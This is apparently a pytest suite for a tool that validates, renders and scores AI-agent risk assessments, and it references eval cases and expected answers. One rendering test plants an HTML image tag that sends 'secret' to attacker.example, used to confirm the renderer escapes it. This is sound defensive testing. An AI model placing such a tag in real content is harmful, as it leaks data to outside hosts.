import copy
import json
from pathlib import Path

import check_cases
import render_report
import run_consistency
import validate

ROOT = Path(__file__).resolve().parent.parent
EXAMPLE = ROOT / "examples" / "support_agent.assessment.json"
SCHEMA = json.loads(validate.DEFAULT_SCHEMA.read_text(encoding="utf-8"))


def example():
    return json.loads(EXAMPLE.read_text(encoding="utf-8"))


def run(doc):
    return validate.check(doc, SCHEMA)


def has(messages, fragment):
    return any(fragment in m for m in messages)


def test_example_is_valid_with_no_warnings():
    errors, warnings = run(example())
    assert errors == []
    assert not warnings


def test_schema_error_on_missing_required_field():
    doc = example()
    del doc["rating"]
    errors, _ = run(doc)
    assert has(errors, "schema:")


def test_schema_error_on_bad_datetime():
    doc = example()
    doc["assessment"]["assessed_at"] = "yesterday"
    errors, _ = run(doc)
    assert has(errors, "assessed_at")


def test_dangling_attack_path_ref():
    doc = example()
    doc["findings"][0]["attack_path"].append({"ref": "cap.ghost"})
    errors, _ = run(doc)
    assert has(errors, "'cap.ghost' not defined")


def test_duplicate_ids():
    doc = example()
    doc["controls"][1]["control_id"] = "cap.crm_read"
    errors, _ = run(doc)
    assert has(errors, "duplicate id 'cap.crm_read'")


def test_residual_above_inherent():
    doc = example()
    f = doc["findings"][0]
    f["inherent_risk"], f["residual_risk"] = "high", "critical"
    errors, _ = run(doc)
    assert has(errors, "exceeds inherent_risk")


def test_projected_below_residual():
    doc = example()
    doc["findings"][0]["forecast"]["projected_risk"] = "moderate"
    errors, _ = run(doc)
    assert has(errors, "below residual_risk")


def test_forecast_horizon_requires_forecast_block():
    doc = example()
    f = copy.deepcopy(doc["findings"][0])
    f["finding_id"] = "f.future"
    f["horizon"] = "forecast"
    del f["forecast"]
    doc["findings"].append(f)
    errors, _ = run(doc)
    assert has(errors, "f.future: no forecast block")


def test_rollup_mismatch():
    doc = example()
    doc["rating"]["residual"] = "moderate"
    errors, _ = run(doc)
    assert has(errors, "rating.residual")


def test_runtime_limitation_required():
    doc = example()
    doc["limitations"] = ["Some other caveat."]
    errors, _ = run(doc)
    assert has(errors, "limitations")


def test_accepted_risk_needs_approver():
    doc = example()
    doc["findings"][0]["treatment"] = {"option": "accept", "owner": "team"}
    errors, _ = run(doc)
    assert has(errors, "approved_by")


def test_rubric_inherent_mismatch_warns():
    doc = example()
    doc["findings"][0]["inherent_risk"] = "high"
    doc["rating"]["inherent"] = "high"
    errors, warnings = run(doc)
    assert errors == []
    assert has(warnings, "rubric computes inherent 'critical'")


def test_residual_below_control_floor_warns():
    doc = example()
    doc["findings"][0]["residual_risk"] = "low"
    doc["rating"]["residual"] = "low"
    _, warnings = run(doc)
    assert has(warnings, "below what path controls can justify ('high')")


def recipient_binding(**extra):
    control = {
        "control_id": "ctl.recipient_binding",
        "name": "Recipient bound to ticket record",
        "category": "preventive",
        "mechanism": "structural",
        "capability_dependence": "independent",
        "covers": ["cap.email_send"],
        "status": "verified",
    }
    control.update(extra)
    return control


def with_low_residual(doc):
    doc["findings"][0]["residual_risk"] = "low"
    doc["rating"]["residual"] = "low"
    return doc


def test_severing_control_allows_low_residual():
    doc = with_low_residual(example())
    doc["controls"].append(recipient_binding(severs_path=True))
    _, warnings = run(doc)
    assert not has(warnings, "below what path controls can justify")


def test_independent_control_without_severs_path_only_narrows():
    # Rubric step 1 needs an explicit severing claim. Without it the control earns step 3 credit only.
    doc = with_low_residual(example())
    doc["controls"].append(recipient_binding())
    _, warnings = run(doc)
    assert has(warnings, "below what path controls can justify ('moderate')")


def test_structural_dependent_control_is_not_double_credited():
    # A structural control that depends on the model earns step 4 credit only, never step 3 and 4.
    doc = example()
    doc["controls"][0]["mechanism"] = "structural"
    caps = {c["capability_id"]: c for c in doc["capabilities"]}
    controls = {c["control_id"]: c for c in doc["controls"]}
    assert validate.residual_floor(doc["findings"][0], caps, controls) == "high"


def test_severs_path_on_behavioral_control_is_error():
    doc = example()
    doc["controls"][0]["severs_path"] = True
    errors, _ = run(doc)
    assert has(errors, "severs_path requires a structural, independent, preventive control")


def gated_example(mode=None):
    doc = example()
    gate = {
        "control_id": "ctl.send_approval",
        "name": "Human approval before send",
        "category": "preventive",
        "mechanism": "structural",
        "capability_dependence": "independent" if mode == "raw_action" else "partially_dependent",
        "decay_rationale": "Approver may see only a model summary.",
        "covers": ["cap.email_send"],
        "status": "verified",
    }
    if mode:
        gate["approval_review_mode"] = mode
    doc["controls"].append(gate)
    doc["capabilities"][1]["approval_gate_ref"] = "ctl.send_approval"
    return doc


def test_summary_gate_floors_residual_at_moderate():
    doc = gated_example("model_summary")
    caps = {c["capability_id"]: c for c in doc["capabilities"]}
    controls = {c["control_id"]: c for c in doc["controls"]}
    assert validate.residual_floor(doc["findings"][0], caps, controls) == "moderate"


def test_raw_action_gate_allows_low_residual():
    doc = gated_example("raw_action")
    caps = {c["capability_id"]: c for c in doc["capabilities"]}
    controls = {c["control_id"]: c for c in doc["controls"]}
    assert validate.residual_floor(doc["findings"][0], caps, controls) == "low"


def test_gate_without_review_mode_warns_and_scores_as_summary():
    doc = gated_example()
    doc["findings"][0]["residual_risk"] = "moderate"
    doc["rating"]["residual"] = "moderate"
    _, warnings = run(doc)
    assert has(warnings, "no approval_review_mode")
    assert not has(warnings, "below what path controls can justify")


def test_declared_a2_without_gate_warns():
    doc = example()
    doc["autonomy"]["level"] = "A2_act_with_approval_on_sensitive"
    _, warnings = run(doc)
    assert has(warnings, "has no approval_gate_ref")


def test_autonomy_modifier_raises_inherent():
    doc = example()
    doc["capabilities"][1]["is_egress"] = False
    doc["capabilities"][1]["reversibility"] = "reversible"
    doc["capabilities"][1]["action"] = "write"
    f = doc["findings"][0]
    inputs = {i["input_id"]: i for i in doc["inputs"]}
    caps = {c["capability_id"]: c for c in doc["capabilities"]}
    assert validate.expected_inherent(f, inputs, caps, {"level": "A3_act_then_report", "max_unattended_steps": 5}) == "high"
    assert validate.expected_inherent(f, inputs, caps, {"level": "A4_fully_autonomous"}) == "critical"
    assert validate.expected_inherent(f, inputs, caps, {"level": "A0_suggest_only"}) == "low"


def test_validate_main_exit_codes(tmp_path):
    assert validate.main([str(EXAMPLE)]) == 0
    bad = example()
    bad["limitations"] = ["x"]
    path = tmp_path / "bad.json"
    path.write_text(json.dumps(bad), encoding="utf-8")
    assert validate.main([str(path)]) == 1
    assert validate.main([str(tmp_path / "missing.json")]) == 2


def test_render_both_views_and_escaping():
    doc = example()
    doc["subject"]["name"] = "Evil | [link](http://x)"
    text = render_report.render(doc, "both")
    assert "## Developer view" in text and "## Reviewer view" in text
    assert "| **critical** | **high** | **critical** |" in text
    assert "Evil \\| \\[link\\](http://x)" in text


def test_render_blocks_raw_html_and_code_span_breakout():
    doc = example()
    doc["findings"][0]["evidence"][0]["observation"] = '<img src="https://attacker.example/x?d=secret">'
    doc["subject"]["agent_id"] = "evil` <b>id"
    text = render_report.render(doc, "reviewer")
    assert "<img" not in text and "&lt;img" in text
    assert "`evil' <b>id`" in text


def test_render_forecast_grammar():
    text = render_report.render(example(), "reviewer")
    assert "`ctl.prompt_rule` fails and the tier becomes" in text
    doc = example()
    doc["findings"][0]["forecast"]["failing_controls"] = ["ctl.prompt_rule", "ctl.send_log"]
    assert "`ctl.send_log` fail and the tier becomes" in render_report.render(doc, "reviewer")


def test_consistency_scores_example_against_case_01():
    exp = json.loads((ROOT / "evals" / "expected" / "01_support_triage.expected.json").read_text(encoding="utf-8"))
    result = run_consistency.score_run(example(), exp, SCHEMA)
    assert result["valid"]
    assert result["recall"] == 1.0
    assert all(result["in_range"].values())
    lines, ok = run_consistency.summarize("01_support_triage", [result, result], 0.8)
    assert ok, lines


def test_eval_cases_and_expected_files_agree():
    assert check_cases.main() == 0


def test_evidence_substring_and_forecast_minimum_scoring():
    exp = {
        "kind": "forecast",
        "rating": {"inherent": ["critical"], "residual": ["high"], "forecast": ["critical"]},
        "required_evidence_substrings": ["instruction only"],
        "required_forecast_findings_min": 1,
        "false_positive_threshold": "moderate",
    }
    result = run_consistency.score_run(example(), exp, SCHEMA)
    # Evidence substring is found; no forecast horizon finding exists, so recall is 1 of 2.
    assert result["recall"] == 0.5
    # The example's present finding has residual high, which counts as a false positive here.
    assert result["false_positives"] == 1


def test_assessor_view_hides_evaluator_notes():
    import run_skill  # pylint: disable=import-outside-toplevel
    for case in sorted((ROOT / "evals" / "cases").glob("*.md")):
        view = run_skill.assessor_view(case.read_text(encoding="utf-8"))
        for leak in ("Kind:", "Source:", "What happened", "backtest", "Backtest", "reconstruct", "(vulnerable", "(edge"):
            assert leak not in view, f"{case.name} leaks '{leak}' to the assessor"
        assert "## Stable ids" in view


def test_extract_json_tolerates_fences_and_rejects_prose():
    import run_skill  # pylint: disable=import-outside-toplevel
    assert run_skill.extract_json('```json\n{"a": 1}\n```') == {"a": 1}
    assert run_skill.extract_json('Here you go: {"a": 1} done') == {"a": 1}
    try:
        run_skill.extract_json("no json here")
    except ValueError:
        pass
    else:
        raise AssertionError("expected ValueError")


def test_pinned_id_lists_reject_retired_atlas_id():
    atlas = check_cases.load_ids("atlas_ids_2026.09.tsv")
    assert "AML.T0104" not in atlas
    assert {"AML.T0086", "AML.T0115.002", "AML.T0118"} <= atlas
    assert check_cases.check_framework_ids() == []


def test_broken_run_file_scores_as_invalid(tmp_path):
    exp = json.loads((ROOT / "evals" / "expected" / "01_support_triage.expected.json").read_text(encoding="utf-8"))
    bad = tmp_path / "run_000.json"
    bad.write_text('{"_parse_error": "no json"}', encoding="utf-8")
    assert run_consistency.score_file(bad, exp, SCHEMA)["valid"] is False
    broken = tmp_path / "run_001.json"
    broken.write_text('{"findings": [{"attack_path": [{}]}]}', encoding="utf-8")
    result = run_consistency.score_file(broken, exp, SCHEMA)
    assert result["valid"] is False


def test_markdown_report_renders_backtests():
    results = [run_consistency.score_run(example(), json.loads(
        (ROOT / "evals" / "expected" / "01_support_triage.expected.json").read_text(encoding="utf-8")), SCHEMA)]
    stats = {"10_backtest_github_mcp": run_consistency.case_stats(results)}
    text = run_consistency.markdown_report(stats, {"10_backtest_github_mcp": "backtest"}, {"model": "test"})
    assert "| 10_backtest_github_mcp | backtest | 1 |" in text
    assert "Backtests" in text


def test_run_skill_end_to_end_with_stubbed_model(tmp_path, monkeypatch):
    import run_skill  # pylint: disable=import-outside-toplevel
    replies = iter([EXAMPLE.read_text(encoding="utf-8"), "I refuse to answer in JSON."])
    monkeypatch.setenv("ANTHROPIC_API_KEY", "test-key")
    monkeypatch.setattr(run_skill, "RUNS", tmp_path)
    monkeypatch.setattr(run_skill, "call_model", lambda *a, **k: (next(replies), {"output_tokens": 10}))
    assert run_skill.main(["--model", "test-model", "--case", "01_support_triage", "--runs", "2"]) == 0
    good = json.loads((tmp_path / "01_support_triage" / "run_000.json").read_text(encoding="utf-8"))
    bad = json.loads((tmp_path / "01_support_triage" / "run_001.json").read_text(encoding="utf-8"))
    assert good["subject"]["agent_id"] == "support-triage"
    assert "_parse_error" in bad
    assert (tmp_path / "01_support_triage" / "run_001.raw.txt").exists()
    meta = json.loads((tmp_path / "01_support_triage" / "run_000.meta.json").read_text(encoding="utf-8"))
    assert meta["output_tokens"] == 10 and "seconds" in meta
    assert [p.name for p in sorted((tmp_path / "01_support_triage").glob(run_consistency.RUN_GLOB))] == [
        "run_000.json", "run_001.json"]
    manifest = json.loads((tmp_path / "manifest.json").read_text(encoding="utf-8"))
    assert manifest["model"] == "test-model" and manifest["rubric_version"] == run_skill.rubric_version()


def test_required_stride_categories_scoring():
    exp = {
        "kind": "coverage",
        "rating": {"inherent": ["critical"], "residual": ["high"], "forecast": ["critical"]},
        "required_stride_categories": ["information_disclosure", "repudiation"],
    }
    # The example finding is labeled information_disclosure and elevation_of_privilege, not repudiation.
    assert run_consistency.score_run(example(), exp, SCHEMA)["recall"] == 0.5


def test_staged_v040_cases_are_consistent(tmp_path, monkeypatch):
    # The staged cases must pass the same checks as live ones once moved into evals/.
    staged = ROOT / "design" / "0.4.0"
    fake = tmp_path / "evals"
    (fake / "cases").mkdir(parents=True)
    (fake / "expected").mkdir()
    for sub in ("cases", "expected"):
        for f in (staged / sub).iterdir():
            (fake / sub / f.name).write_text(f.read_text(encoding="utf-8"), encoding="utf-8")
    monkeypatch.setattr(check_cases, "EVALS", fake)
    problems = []
    for exp_path in sorted((fake / "expected").glob("*.expected.json")):
        problems += check_cases.check_case(exp_path)
    assert problems == []


def test_run_skill_truncation_resume_and_metadata(tmp_path, monkeypatch):
    import run_skill  # pylint: disable=import-outside-toplevel
    good = EXAMPLE.read_text(encoding="utf-8")
    replies = iter([
        (good[:500], {"stop_reason": "max_tokens", "output_tokens": 32000}),
        (good, {"stop_reason": "end_turn", "output_tokens": 9000}),
    ])
    monkeypatch.setenv("ANTHROPIC_API_KEY", "test-key")
    monkeypatch.setattr(run_skill, "RUNS", tmp_path)
    monkeypatch.setattr(run_skill, "call_model", lambda *a, **k: next(replies))
    args = ["--model", "test-model", "--case", "01_support_triage", "--runs", "1", "--resume"]

    run_skill.main(args)
    out = tmp_path / "01_support_triage" / "run_000.json"
    assert "truncated" in json.loads(out.read_text(encoding="utf-8"))["_parse_error"]
    assert not run_skill.completed(out)

    run_skill.main(args)  # --resume redoes the failed run instead of skipping it
    doc = json.loads(out.read_text(encoding="utf-8"))
    assert run_skill.completed(out)
    assessor = doc["assessment"]["assessor"]
    assert assessor["model"] == "test-model" and assessor["version"] == run_skill.skill_version()
    assert doc["assessment"]["assessed_at"].endswith("Z")


def test_tally_error_kind_normalizes_ids_and_values():
    import tally_runs  # pylint: disable=import-outside-toplevel
    a = tally_runs.error_kind("findings/f.one: toxic_combination id 'TC1' is not defined")
    b = tally_runs.error_kind("findings/f.two: toxic_combination id 'TC4' is not defined")
    assert a == b


def test_manifest_keeps_original_start_and_records_every_limit(tmp_path, monkeypatch):
    import argparse  # pylint: disable=import-outside-toplevel
    import run_skill  # pylint: disable=import-outside-toplevel
    monkeypatch.setattr(run_skill, "RUNS", tmp_path)
    monkeypatch.setattr(run_skill, "git_commit", lambda: "abc1234")
    first = argparse.Namespace(model="m", runs=5, temperature=None, max_tokens=32000)
    run_skill.write_manifest(first)
    started = json.loads((tmp_path / "manifest.json").read_text(encoding="utf-8"))["started_at"]
    run_skill.write_manifest(argparse.Namespace(model="m", runs=5, temperature=None, max_tokens=64000))
    manifest = json.loads((tmp_path / "manifest.json").read_text(encoding="utf-8"))
    assert manifest["started_at"] == started
    assert manifest["max_tokens"] == [32000, 64000]
    assert "last_resumed_at" in manifest


def test_elements_and_peers_are_referenceable():
    doc = example()
    doc["elements"].append({"element_id": "store.quota", "kind": "data_store", "refs": ["cap.email_send"]})
    doc["controls"][1]["covers"] = ["cap.email_send", "store.quota", "mail_mcp"]
    doc["findings"][0]["toxic_combination"].append("store.quota")
    errors, _ = run(doc)
    assert not errors


def test_unknown_references_still_fail():
    doc = example()
    doc["controls"][1]["covers"] = ["store.nowhere"]
    doc["elements"][0]["refs"] = ["cap.missing"]
    doc["findings"][0]["attack_path"].append({"ref": "prompt.md:4-5"})
    errors, _ = run(doc)
    assert has(errors, "covers unknown id 'store.nowhere'")
    assert has(errors, "refs unknown id 'cap.missing'")
    assert has(errors, "attack_path ref 'prompt.md:4-5' not defined")


def planned_example(horizon, triggers):
    doc = example()
    doc["capabilities"].append({
        "capability_id": "cap.web_fetch", "action": "send_external", "target": "Any URL",
        "data_sensitivity": "public", "reversibility": "irreversible", "is_egress": True, "planned": True,
    })
    f = doc["findings"][0]
    f["horizon"] = horizon
    f["attack_path"].append({"ref": "cap.web_fetch"})
    f["forecast"]["triggers"] = triggers
    return doc


def test_planned_capability_rejected_in_present_finding():
    errors, _ = run(planned_example("present", ["model_upgrade"]))
    assert has(errors, "present finding references planned element(s) ['cap.web_fetch']")


def test_planned_capability_allowed_in_forecast_with_adding_trigger():
    errors, warnings = run(planned_example("forecast", ["new_tool"]))
    assert not has(errors, "planned element")
    assert not has(warnings, "no trigger that adds them")
    _, warnings = run(planned_example("forecast", ["model_upgrade"]))
    assert has(warnings, "no trigger that adds them")


def test_json_inputs_tolerate_byte_order_mark(tmp_path):
    # PowerShell 5 and some Windows editors save UTF-8 with a byte order mark.
    doc_path = tmp_path / "bom.assessment.json"
    doc_path.write_text(EXAMPLE.read_text(encoding="utf-8"), encoding="utf-8-sig")
    assert validate.main([str(doc_path), "--strict"]) == 0
    exp = json.loads((ROOT / "evals" / "expected" / "01_support_triage.expected.json").read_text(encoding="utf-8"))
    assert run_consistency.score_file(doc_path, exp, SCHEMA)["valid"] is True


def test_element_may_link_to_peer_with_same_id():
    # v0.3.1 batch: runs declared an element named after the protocol peer and linked it to the peer.
    doc = example()
    doc["elements"].append({"element_id": "mail_mcp", "kind": "process", "refs": ["mail_mcp"]})
    errors, _ = run(doc)
    assert not has(errors, "refs unknown id")
    doc["elements"].append({"element_id": "store.loop", "kind": "data_store", "refs": ["store.loop"]})
    errors, _ = run(doc)
    assert has(errors, "elements/store.loop: refs unknown id 'store.loop'")


def test_residual_above_floor_needs_rationale():
    doc = example()
    doc["findings"][0]["residual_risk"] = "critical"
    doc["rating"]["residual"] = "critical"
    _, warnings = run(doc)
    assert has(warnings, "above the rubric floor ('high') with no residual_rationale")
    doc["findings"][0]["residual_rationale"] = "Recipient field is model chosen, so logging only detects after the fact."
    _, warnings = run(doc)
    assert not has(warnings, "residual_rationale")


def test_main_path_residual_is_isolated_from_rollup():
    exp = json.loads((ROOT / "evals" / "expected" / "01_support_triage.expected.json").read_text(encoding="utf-8"))
    doc = example()
    extra = json.loads(json.dumps(doc["findings"][0]))
    extra.update({"finding_id": "f.other", "residual_risk": "critical", "attack_path": [{"ref": "cap.email_send"}]})
    doc["findings"].append(extra)
    doc["rating"]["residual"] = "critical"
    result = run_consistency.score_run(doc, exp, SCHEMA)
    assert result["rating"]["residual"] == "critical"
    assert result["main_path_residual"] == "high"
    stats = run_consistency.case_stats([result, run_consistency.score_run(example(), exp, SCHEMA)])
    assert stats["residual"]["agreement"] == 0.5 and stats["main_path_residual"] == 1.0


def test_every_finding_requires_a_forecast():
    doc = example()
    del doc["findings"][0]["forecast"]
    errors, _ = run(doc)
    assert has(errors, "no forecast block; every finding needs one")


def test_unchanged_forecast_is_valid():
    # A forecast that projects no change is a real result and passes.
    doc = example()
    f = doc["findings"][0]
    f["forecast"] = {"triggers": ["model_upgrade"], "failing_controls": [], "projected_risk": f["residual_risk"],
                     "watch_signal": "Model version change"}
    doc["rating"]["forecast"] = f["residual_risk"]
    errors, _ = run(doc)
    assert not has(errors, "forecast")


def test_validator_runs_rubric_checks_without_jsonschema(monkeypatch):
    monkeypatch.setattr(validate, "Draft202012Validator", None)
    errors, warnings = run(example())
    assert not errors and has(warnings, "schema check skipped")
    doc = example()
    del doc["findings"][0]["forecast"]
    errors, _ = run(doc)
    assert has(errors, "no forecast block")
    errors, _ = run({"schema_version": "0.5.0"})
    assert has(errors, "structure: missing required field 'findings'")


def test_validation_checklist_covers_every_validator_error():
    # The plain language checklist must keep pace with the validator's error rules.
    import re  # pylint: disable=import-outside-toplevel
    source = (ROOT / "skills" / "para" / "scripts" / "validate.py").read_text(encoding="utf-8")
    checklist = (ROOT / "skills" / "para" / "references" / "validation_checklist.md").read_text(encoding="utf-8")
    error_rules = len(re.findall(r"errors\.append\(", source))
    assert checklist.count("**Error:**") >= 15, "checklist lost error rules"
    assert error_rules <= 30, "validator grew; review validation_checklist.md and raise this bound"


class _Obj:  # pylint: disable=too-few-public-methods
    def __init__(self, **kw):
        self.__dict__.update(kw)


def test_openai_compatible_call_maps_parameters_and_usage():
    import run_skill  # pylint: disable=import-outside-toplevel
    sent = {}

    def create(**kwargs):
        sent.update(kwargs)
        return _Obj(
            choices=[_Obj(message=_Obj(content='{"a": 1}'), finish_reason="length")],
            usage=_Obj(prompt_tokens=20000, completion_tokens=900, prompt_tokens_details=_Obj(cached_tokens=18000)),
        )

    client = _Obj(chat=_Obj(completions=_Obj(create=create)))
    options = {"provider": "openai", "token_param": "max_completion_tokens", "reasoning_effort": "low",
               "json_mode": True}
    text, meta = run_skill.call_model(client, "my-deployment", "SYS", "USER", 64000, None, options)
    assert text == '{"a": 1}'
    assert sent["max_completion_tokens"] == 64000 and "temperature" not in sent
    assert sent["reasoning_effort"] == "low" and sent["response_format"] == {"type": "json_object"}
    assert sent["messages"][0] == {"role": "system", "content": "SYS"}
    assert meta["stop_reason"] == "max_tokens" and meta["cache_read_input_tokens"] == 18000


def test_run_cost_handles_cached_tokens_per_provider():
    import run_skill  # pylint: disable=import-outside-toplevel
    prices = {"in": 2.0, "cached_in": 0.5, "out": 10.0}
    openai_meta = {"provider": "openai", "input_tokens": 20000, "cache_read_input_tokens": 18000, "output_tokens": 1000}
    # 2,000 uncached at $2, 18,000 cached at $0.50, 1,000 out at $10, per million.
    assert abs(run_skill.run_cost(openai_meta, prices) - (2000 * 2 + 18000 * 0.5 + 1000 * 10) / 1e6) < 1e-9
    anthropic_meta = {"provider": "anthropic", "input_tokens": 600, "cache_read_input_tokens": 20000, "output_tokens": 1000}
    assert abs(run_skill.run_cost(anthropic_meta, prices) - (600 * 2 + 20000 * 0.5 + 1000 * 10) / 1e6) < 1e-9
    assert run_skill.run_cost(openai_meta, {"in": None, "out": None}) is None


def test_smoke_set_and_estimate():
    import run_skill  # pylint: disable=import-outside-toplevel
    smoke = run_skill.select_cases(None, "smoke")
    assert smoke and {c.stem for c in smoke} <= set(run_skill.SMOKE_SET)
    lines = run_skill.estimate(smoke, "x" * 80000, 1, 20000, {"in": 1.0, "cached_in": 0.25, "out": 8.0})
    assert "calls" in lines[0] and any("cached" in line for line in lines)


def test_budget_guard_stops_and_manifest_records_provider(tmp_path, monkeypatch):
    import run_skill  # pylint: disable=import-outside-toplevel
    monkeypatch.setenv("AZURE_TEST_KEY", "secret-value")
    monkeypatch.setattr(run_skill, "make_client", lambda args: (object(), (RuntimeError,)))
    monkeypatch.setattr(run_skill, "call_model", lambda *a, **k: (
        EXAMPLE.read_text(encoding="utf-8"),
        {"input_tokens": 1_000_000, "output_tokens": 0, "stop_reason": "stop"}))
    code = run_skill.main([
        "--provider", "openai", "--api-key-env", "AZURE_TEST_KEY", "--model", "dep",
        "--base-url", "https://example-resource.openai.azure.com/openai/v1/",
        "--case", "01_support_triage", "--runs", "3", "--out", str(tmp_path),
        "--price-in", "1", "--price-out", "1", "--budget-usd", "1",
    ])
    assert code == 0
    runs = sorted((tmp_path / "01_support_triage").glob(run_consistency.RUN_GLOB))
    assert len(runs) == 1  # $1 spent on the first call, so the guard stops before the second
    manifest = json.loads((tmp_path / "manifest.json").read_text(encoding="utf-8"))
    assert manifest["provider"] == "openai" and manifest["endpoint"] == "example-resource.openai.azure.com"
    assert "secret-value" not in (tmp_path / "manifest.json").read_text(encoding="utf-8")


def test_prompt_pack_is_current_and_complete():
    import importlib.util  # pylint: disable=import-outside-toplevel
    spec = importlib.util.spec_from_file_location("build_prompt_pack", ROOT / "tools" / "build_prompt_pack.py")
    pack = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(pack)
    text = pack.build()
    assert not text.split("## SKILL.md", 1)[1].lstrip().startswith("---\nname:")
    assert "## references/validation_checklist.md" in text and "## schema/assessment.schema.json" in text
    assert pack.main(["--check"]) == 0


def test_skill_frontmatter_follows_agent_skills_spec():
    # agentskills.io: only these fields; name matches the folder; lowercase letters, digits, single hyphens.
    import re  # pylint: disable=import-outside-toplevel
    skill_dir = ROOT / "skills" / "para"
    text = (skill_dir / "SKILL.md").read_text(encoding="utf-8")
    front = text.split("---\n", 2)[1]
    top_keys = re.findall(r"^([A-Za-z_-]+):", front, flags=re.MULTILINE)
    assert set(top_keys) <= {"name", "description", "license", "compatibility", "metadata", "allowed-tools"}
    name = re.search(r"^name: (.+)$", front, flags=re.MULTILINE).group(1).strip()
    assert name == skill_dir.name and re.fullmatch(r"[a-z0-9]+(-[a-z0-9]+)*", name) and len(name) <= 64
    description = re.search(r"^description: (.+)$", front, flags=re.MULTILINE).group(1)
    compatibility = re.search(r"^compatibility: (.+)$", front, flags=re.MULTILINE).group(1)
    assert len(description) <= 1024 and len(compatibility) <= 500
    assert len(text.splitlines()) < 500


def test_clients_get_retry_setting(monkeypatch):
    import argparse  # pylint: disable=import-outside-toplevel
    import run_skill  # pylint: disable=import-outside-toplevel
    monkeypatch.setenv("TEST_KEY", "k")
    args = argparse.Namespace(provider="openai", api_key_env="TEST_KEY", base_url="https://x.example/openai/v1/",
                              max_retries=8)
    client, _ = run_skill.make_client(args)
    assert client.max_retries == 8
    assert run_skill.build_parser().parse_args([]).max_retries == 8


def test_enum_hints_point_to_the_right_value_or_field():
    doc = example()
    doc["protocols"][0]["peer_trust_level"] = "third_party"
    doc["findings"][0]["threat_refs"].append({"framework": "NIST_AI_RMF", "id": "MEASURE 2.7", "framework_edition": "1.0"})
    errors, _ = run(doc)
    assert has(errors, "hint: use 'untrusted'")
    assert has(errors, "belong in governance_refs, not threat_refs")


def test_structural_recommendation_needs_a_missing_control_on_the_path():
    doc = example()
    doc["controls"] = [c for c in doc["controls"] if c["status"] != "missing_recommended"]
    _, warnings = run(doc)
    assert has(warnings, "structural recommendation(s) but no missing_recommended control")
    _, warnings = run(example())
    assert not has(warnings, "no missing_recommended control")
